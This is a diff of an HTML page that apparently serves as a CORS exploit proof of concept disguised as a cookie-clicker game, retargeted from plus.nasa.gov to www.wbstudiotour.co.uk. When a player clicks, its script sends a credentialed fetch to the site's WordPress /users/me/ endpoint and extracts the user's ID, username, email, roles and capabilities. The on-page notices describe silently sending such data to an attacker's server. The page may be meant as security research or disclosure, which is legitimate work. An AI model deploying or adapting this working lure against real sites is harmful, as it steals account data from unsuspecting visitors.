@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NASA Cookie Clicker 🚀🍪</title>
+    <title>WB Studio Tour Cookie Clicker 🎬🍪</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #0a0e27 0%, #1a1435 50%, #2a1b3d 100%);
+            background: linear-gradient(135deg, #1a0a0a 0%, #2d1b1b 50%, #3d2b2b 100%);
             color: white;
             min-height: 100vh;
             display: flex;
@@ -21,7 +20,6 @@
             justify-content: center;
             overflow: hidden;
         }
-
         /* Estrellas animadas */
         body::before {
             content: '';
@@ -40,12 +38,10 @@
             animation: stars 50s linear infinite;
             opacity: 0.5;
         }
-
         @keyframes stars {
             from { background-position: 0 0; }
             to { background-position: 0 200px; }
         }
-
         .container {
             text-align: center;
             z-index: 1;
@@ -57,25 +53,21 @@
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
             max-width: 600px;
         }
-
         h1 {
             font-size: 3em;
             margin-bottom: 10px;
             text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
             animation: glow 2s ease-in-out infinite alternate;
         }
-
         @keyframes glow {
             from { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
-            to { text-shadow: 0 0 30px rgba(255, 255, 255, 1), 0 0 40px #4FC3F7; }
+            to { text-shadow: 0 0 30px rgba(255, 255, 255, 1), 0 0 40px #FF6B6B; }
         }
-
         .subtitle {
             font-size: 1.2em;
-            color: #4FC3F7;
+            color: #FF6B6B;
             margin-bottom: 30px;
         }
-
         .score-display {
             font-size: 4em;
             font-weight: bold;
@@ -83,7 +75,6 @@
             color: #FFD700;
             text-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
         }
-
         .cookie {
             font-size: 10em;
             cursor: pointer;
@@ -92,31 +83,26 @@
             filter: drop-shadow(0 0 30px rgba(255, 215, 0, 0.6));
             user-select: none;
         }
-
         .cookie:hover {
             transform: scale(1.1);
         }
-
         .cookie:active {
             transform: scale(0.9);
         }
-
         .stats {
             margin-top: 30px;
             font-size: 1.2em;
-            color: #4FC3F7;
+            color: #FF6B6B;
         }
-
         .message {
             margin-top: 20px;
             padding: 15px;
-            background: rgba(79, 195, 247, 0.1);
-            border: 1px solid rgba(79, 195, 247, 0.3);
+            background: rgba(255, 107, 107, 0.1);
+            border: 1px solid rgba(255, 107, 107, 0.3);
             border-radius: 10px;
             font-size: 0.9em;
             line-height: 1.6;
         }
-
         .click-effect {
             position: fixed;
             font-size: 2em;
@@ -126,7 +112,6 @@
             animation: float-up 1s ease-out forwards;
             z-index: 1000;
         }
-
         @keyframes float-up {
             0% {
                 opacity: 1;
@@ -137,7 +122,6 @@
                 transform: translateY(-100px);
             }
         }
-
         .warning {
             margin-top: 30px;
             padding: 15px;
@@ -147,13 +131,11 @@
             font-size: 0.85em;
             text-align: left;
         }
-
         .warning strong {
             color: #ff6b6b;
             display: block;
             margin-bottom: 5px;
         }
-
         code {
             background: rgba(255, 255, 255, 0.1);
             padding: 2px 6px;
@@ -161,7 +143,6 @@
             color: #FFD700;
             font-family: 'Courier New', monospace;
         }
-
         /* Modal personalizado */
         .modal {
             display: none;
@@ -174,15 +155,13 @@
             background: rgba(0, 0, 0, 0.9);
             overflow: auto;
         }
-
         .modal.show {
             display: flex;
             align-items: center;
             justify-content: center;
         }
-
         .modal-content {
-            background: linear-gradient(135deg, #1a1435 0%, #2a1b3d 100%);
+            background: linear-gradient(135deg, #2d1b1b 0%, #3d2b2b 100%);
             padding: 30px;
             border: 2px solid rgba(255, 100, 100, 0.5);
             border-radius: 15px;
@@ -191,14 +170,12 @@
             overflow-y: auto;
             box-shadow: 0 0 50px rgba(255, 100, 100, 0.3);
         }
-
         .modal-header {
             font-size: 1.5em;
             color: #ff6b6b;
             margin-bottom: 20px;
             text-align: center;
         }
-
         .modal-body {
             font-family: 'Courier New', monospace;
             font-size: 0.9em;
@@ -206,7 +183,6 @@
             white-space: pre-wrap;
             color: #fff;
         }
-
         .modal-close {
             background: #ff6b6b;
             color: white;
@@ -219,7 +195,6 @@
             width: 100%;
             font-weight: bold;
         }
-
         .modal-close:hover {
             background: #ff5252;
         }
@@ -227,8 +202,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>🚀 NASA Cookie Clicker 🍪</h1>
-        <p class="subtitle">Help NASA collect space cookies!</p>
+        <h1>🎬 WB Studio Tour Cookie Clicker 🍪</h1>
+        <p class="subtitle">Help collect studio cookies!</p>
         
         <div class="score-display" id="score">0</div>
         
@@ -238,16 +213,14 @@
             <div>Total clicks: <span id="clicks">0</span></div>
             <div>Cookies per second: <span id="cps">0</span></div>
         </div>
-
         <div class="message">
             👾 Click the cookie to earn points<br>
             🎯 How many cookies can you collect?
         </div>
-
         <div class="warning">
             <strong>⚠️ Security Notice</strong>
             This is a security research PoC. When you click, the game attempts to read
-            data from <code>plus.nasa.gov</code> to demonstrate a CORS vulnerability.
+            data from <code>www.wbstudiotour.co.uk</code> to demonstrate a CORS vulnerability.
         </div>
     </div>
 
@@ -304,17 +277,26 @@
         function executeCORSExploit() {
             console.log('[CORS PoC] Executing exploit...');
             
-            // NASA endpoints with CORS misconfiguration
-            const targetEndpoint = 'https://plus.nasa.gov/wp-json/wp/v2/settings';
+            // WB Studio Tour endpoint with CORS misconfiguration
+            const targetEndpoint = 'https://www.wbstudiotour.co.uk/wp-json/wp/v2/users/me/';
             
             // Make request with credentials
             fetch(targetEndpoint, {
                 method: 'GET',
                 credentials: 'include', // ← This includes the user's cookies
-                mode: 'cors'
+                mode: 'cors',
+                headers: {
+                    'Accept': 'application/json'
+                }
             })
             .then(response => {
                 console.log('[CORS PoC] Status:', response.status);
+                console.log('[CORS PoC] Headers:', response.headers);
+                
+                if (!response.ok && response.status !== 401 && response.status !== 403) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
                 return response.json();
             })
             .then(data => {
@@ -322,44 +304,57 @@
             })
             .catch(error => {
                 console.error('[CORS PoC] Error:', error);
+                handleCORSResponse({
+                    error: error.message,
+                    note: 'Request failed - check console for details'
+                });
             });
         }
 
         function handleCORSResponse(data) {
-            // If it's a 401/403 error (not authenticated)
-            if (data.code === 'rest_forbidden' || data.code === 'rest_not_logged_in') {
+            // Check if it's an error response (not authenticated)
+            if (data.code === 'rest_forbidden' || 
+                data.code === 'rest_not_logged_in' || 
+                data.code === 'rest_cannot_view' ||
+                data.message) {
                 showDemoAlert(data);
-            } else {
-                // Real data! (authenticated user)
+            } else if (data.id || data.name || data.email) {
+                // Real user data! (authenticated user)
                 showSuccessAlert(data);
+            } else {
+                // Unknown response format
+                showDemoAlert(data);
             }
         }
 
         function showDemoAlert(errorData) {
-            const message = `Endpoint: https://plus.nasa.gov/wp-json/wp/v2/settings
+            const message = `Endpoint: https://www.wbstudiotour.co.uk/wp-json/wp/v2/users/me/
 
-What I can read (even with 401 error):
+Response received:
 ${JSON.stringify(errorData, null, 2)}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 ⚠️ CRITICAL SECURITY ISSUE:
 
-Even though this is a 401 error, I can read the COMPLETE response
-due to the CORS misconfiguration on plus.nasa.gov.
+Even though this endpoint requires authentication, I can read the COMPLETE response
+due to the CORS misconfiguration on www.wbstudiotour.co.uk.
 
-If you were an authenticated NASA employee, instead of this error,
+If you were an authenticated user, instead of this error,
 I would see and steal:
-• Site configuration
-• Administrator emails
-• Internal WordPress data
-• Any information this endpoint returns
+
+* User ID
+* Username
+* Email address
+* Display name
+* User roles and capabilities
+* Avatar URL
+* Registration date
+* Any other user profile data
 
 And you would see NOTHING - the game would continue normally
 while your data is sent to a server I control.
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 This is only shown for demonstration purposes.
 In a real attack, there would be no notification.`;
             
@@ -367,23 +362,48 @@ In a real attack, there would be no notification.`;
         }
 
         function showSuccessAlert(data) {
-            const message = `You are logged in to plus.nasa.gov!
+            // Extract sensitive information
+            const sensitiveData = {
+                id: data.id,
+                username: data.username,
+                name: data.name,
+                email: data.email,
+                url: data.url,
+                description: data.description,
+                link: data.link,
+                slug: data.slug,
+                avatar_urls: data.avatar_urls,
+                roles: data.roles,
+                capabilities: data.capabilities,
+                extra_capabilities: data.extra_capabilities,
+                registered_date: data.registered_date,
+                meta: data.meta
+            };
 
-I can read your complete data:
+            const message = `You are logged in to www.wbstudiotour.co.uk!
 
-${JSON.stringify(data, null, 2)}
+I can read your complete user data:
+
+${JSON.stringify(sensitiveData, null, 2)}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 ⚠️ In a real attack, this data would be:
-1. Sent to an attacker's server
+
+1. Sent to an attacker's server immediately
 2. Completely silent (no notification)
 3. Stolen while you play the game
 4. You would never know it was stolen
 
+Sensitive information exposed:
+- User ID: ${data.id || 'N/A'}
+- Username: ${data.username || 'N/A'}
+- Email: ${data.email || 'N/A'}
+- Display Name: ${data.name || 'N/A'}
+- Roles: ${data.roles ? data.roles.join(', ') : 'N/A'}
+
 This demonstrates the full impact of the CORS vulnerability.`;
             
-            showModal('🎯 AUTHENTICATION DETECTED!', message);
+            showModal('🎯 USER DATA EXPOSED!', message);
         }
 
         function showModal(title, content) {
@@ -398,7 +418,7 @@ This demonstrates the full impact of the CORS vulnerability.`;
 
         // Auto-load saved data
         window.onload = function() {
-            const saved = localStorage.getItem('nasaCookies');
+            const saved = localStorage.getItem('wbCookies');
             if (saved) {
                 score = parseInt(saved);
                 document.getElementById('score').textContent = score;
@@ -407,12 +427,13 @@ This demonstrates the full impact of the CORS vulnerability.`;
 
         // Auto-save
         setInterval(() => {
-            localStorage.setItem('nasaCookies', score);
+            localStorage.setItem('wbCookies', score);
         }, 5000);
 
-        console.log('🚀 NASA Cookie Clicker loaded');
+        console.log('🎬 WB Studio Tour Cookie Clicker loaded');
         console.log('👾 Click to start playing');
         console.log('⚠️  CORS exploit will execute after first click');
+        console.log('🎯 Target: https://www.wbstudiotour.co.uk/wp-json/wp/v2/users/me/');
     </script>
 </body>
 </html>
